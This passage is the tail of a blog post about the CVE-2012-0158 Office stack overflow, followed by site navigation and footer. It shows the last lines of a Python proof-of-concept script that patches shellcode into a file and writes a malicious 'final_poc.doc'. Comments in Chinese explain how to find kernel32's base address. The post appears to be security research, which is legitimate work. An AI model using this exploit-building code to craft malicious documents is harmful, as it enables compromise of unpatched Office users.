final&#x3D;ans.replace(ans[index:index+len(shellcode_str)],shellcode_str)</span><br><span class="line">	#print final</span><br><span class="line">	with open(&quot;.&#x2F;final_poc.doc&quot;,&quot;wb+&quot;) as f2:</span><br><span class="line">		f2.write(final)</span><br><span class="line">#考虑到加载地址变化问题</span><br><span class="line">#可以在shellcode里从MSCOMCTL.OCX中获得一个kernel32地址，再根据偏移计算基址</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/9027235-deb3a2357b6b30c9.gif?imageMogr2/auto-orient/strip" alt="PWN"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/CTF-Writeups/">CTF-Writeups</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analyze"><span class="toc-number">1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">2.</span> <span class="toc-text">POC</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/03/01/CVE-2012-0158-Office-Stack-Overflow/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/03/01/CVE-2012-0158-Office-Stack-Overflow/&text=CVE-2012-0158 Office Stack Overflow" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/03/01/CVE-2012-0158-Office-Stack-Overflow/&title=CVE-2012-0158 Office Stack Overflow" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/03/01/CVE-2012-0158-Office-Stack-Overflow/&is_video=false&description=CVE-2012-0158 Office Stack Overflow" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2012-0158 Office Stack Overflow&body=Check out this article: http://yoursite.com/2019/03/01/CVE-2012-0158-Office-Stack-Overflow/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/03/01/CVE-2012-0158-Office-Stack-Overflow/&title=CVE-2012-0158 Office Stack Overflow" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/03/01/CVE-2012-0158-Office-Stack-Overflow/&title=CVE-2012-0158 Office Stack Overflow" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/03/01/CVE-2012-0158-Office-Stack-Overflow/&title=CVE-2012-0158 Office Stack Overflow" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/03/01/CVE-2012-0158-Office-Stack-Overflow/&title=CVE-2012-0158 Office Stack Overflow" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/03/01/CVE-2012-0158-Office-Stack-Overflow/&name=CVE-2012-0158 Office Stack Overflow&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2021 Kirin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/CTF-Writeups/">CTF-Writeups</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


